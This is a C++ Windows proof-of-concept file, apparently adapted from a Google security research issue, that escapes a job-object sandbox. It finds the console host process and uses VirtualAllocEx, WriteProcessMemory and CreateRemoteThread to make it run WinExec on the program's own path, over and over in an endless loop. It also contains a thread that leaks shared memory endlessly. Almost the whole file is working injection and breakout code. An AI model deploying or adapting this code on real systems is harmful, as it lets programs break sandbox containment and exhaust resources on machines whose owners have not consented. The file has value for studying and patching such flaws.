// JobBreakoutTest.cpp : Defines the entry point for the application.
// Modified from source provided in https://code.google.com/p/google-security-research/issues/detail?id=213
//

#include "stdafx.h"

// Windows Header Files:
#include <windows.h>

// C RunTime Header Files
#include <stdlib.h>
#include <malloc.h>
#include <memory.h>
#include <tchar.h>

#include <TlHelp32.h>



int GetConhostPid()
{
	int ppid = GetCurrentProcessId();
	int pid = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESSENTRY32 pe32;

	pe32.dwSize = sizeof(pe32);

	if (Process32First(hSnapshot, &pe32))
	{
		do
		{
			if (pe32.th32ParentProcessID == ppid)
			{
				pid = pe32.th32ProcessID;
				break;
			}

		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);

	return pid;
}

bool InjectExe(LPCSTR lpName)
{
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, GetConhostPid());
	if (hProcess)
	{
		size_t strSize = strlen(lpName) + 1;
		LPVOID pBuf = VirtualAllocEx(hProcess, 0, strSize, MEM_COMMIT, PAGE_READWRITE);
		if (pBuf == NULL)
		{
			return false;
		}
		SIZE_T written;
		if (!WriteProcessMemory(hProcess, pBuf, lpName, strSize, &written))
		{
			return false;
		}

		// TODO: on a sunny day replace WinExec with CreateProcess
		LPVOID pWinExec = GetProcAddress(GetModuleHandle(L"kernel32"), "WinExec");

		HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pWinExec, pBuf, 0, NULL);

		if (!hThread)
		{
			return false;
		}

		if (WaitForSingleObject(hThread, 4000) != WAIT_OBJECT_0)
		{
			return false;
		}
	}
	else
	{
		return false;
	}

	return true;
}


DWORD WINAPI leakSharedMemory(LPVOID lpParam)
{
	DWORD initialSize = 1024 * 1024 * 200;


	while (1){
		wchar_t name[1000];
		SYSTEMTIME st;
		GetSystemTime(&st);
		wsprintf(name, L"%02d-%02d-%02d", st.wMinute, st.wSecond, st.wMilliseconds);

		HANDLE hMapFile = CreateFileMapping(
			INVALID_HANDLE_VALUE,    // use paging file
			NULL,                    // default security
			PAGE_READWRITE,          // read/write access
			0,                       // maximum object size (high-order DWORD)
			initialSize,                // maximum object size (low-order DWORD)
			name);                  // name of mapping object


		if (hMapFile == NULL) {
			if (initialSize > 8) {
				initialSize = initialSize / 2;
			}
		}
		else {
			if (initialSize < 1024 * 1024 * 200) {
				initialSize = initialSize * 2;
			}
		}
	}

	return 0;
}


int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	WCHAR  * cmdline;

	WCHAR szFileName[MAX_PATH + 1];
	GetModuleFileName(NULL, szFileName, MAX_PATH);

	cmdline = szFileName;

	int bufsize = wcslen(cmdline) + 1;
	char *mbuffer = (char *)malloc(bufsize);

	size_t i;
	wcstombs_s(&i, mbuffer, (size_t)bufsize, cmdline, (size_t)bufsize);

	AllocConsole();

	while (1) {
		InjectExe(mbuffer);
	}

	return 0;
}
